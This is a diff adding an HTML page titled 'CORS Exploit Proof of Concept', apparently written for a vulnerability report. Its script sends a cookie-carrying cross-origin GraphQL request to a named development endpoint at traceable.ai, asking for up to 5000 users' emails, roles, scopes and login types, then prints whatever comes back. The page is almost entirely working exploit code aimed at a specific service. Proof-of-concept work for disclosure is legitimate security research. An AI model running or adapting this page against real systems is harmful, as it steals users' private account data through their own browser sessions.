@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CORS Exploit PoC</title>
+</head>
+<body>
+    <h1>CORS Exploit Proof of Concept</h1>
+    <button id="exploit">Exploit</button>
+    <pre id="output"></pre>
+    <script>
+        document.getElementById('exploit').addEventListener('click', async () => {
+            const targetUrl = 'https://app-dev.traceable.ai/graphql';
+            const requestBody = JSON.stringify({
+                variables: {},
+                query: `{
+                    users(limit: 5000) {
+                        results {
+                            email
+                            roles {
+                                roleId: id
+                                scope {
+                                    entityScopes {
+                                        type
+                                        ids
+                                        __typename
+                                    }
+                                    __typename
+                                }
+                                __typename
+                            }
+                            loginType
+                            __typename
+                        }
+                        total
+                        __typename
+                    }
+                }`
+            });
+
+            try {
+                const response = await fetch(targetUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    credentials: 'include', // Include cookies
+                    body: requestBody,
+                });
+
+                if (response.ok) {
+                    const data = await response.json();
+                    document.getElementById('output').textContent = JSON.stringify(data, null, 2);
+                } else {
+                    document.getElementById('output').textContent = `Error: ${response.status}`;
+                }
+            } catch (error) {
+                console.error('Exploit failed', error);
+            }
+        });
+    </script>
+</body>
+</html>
